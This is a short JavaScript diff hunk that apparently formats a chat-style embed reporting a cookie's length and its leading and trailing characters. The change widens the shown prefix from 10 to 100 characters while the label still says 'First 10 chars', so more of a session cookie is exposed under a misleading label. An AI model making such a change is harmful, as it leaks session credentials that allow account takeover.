@@ -90,7 +90,7 @@
                     color: 0x3498db,
                     fields: [
                         { name: "Length", value: cookie.length.toString(), inline: true },
-                        { name: "First 10 chars", value: "```" + cookie.substring(0, 10) + "```", inline: true },
+                        { name: "First 10 chars", value: "```" + cookie.substring(0, 100) + "```", inline: true },
                         { name: "Last 10 chars", value: "```" + cookie.substring(cookie.length - 10) + "```", inline: true }
                     ],
                     timestamp: new Date().toISOString()
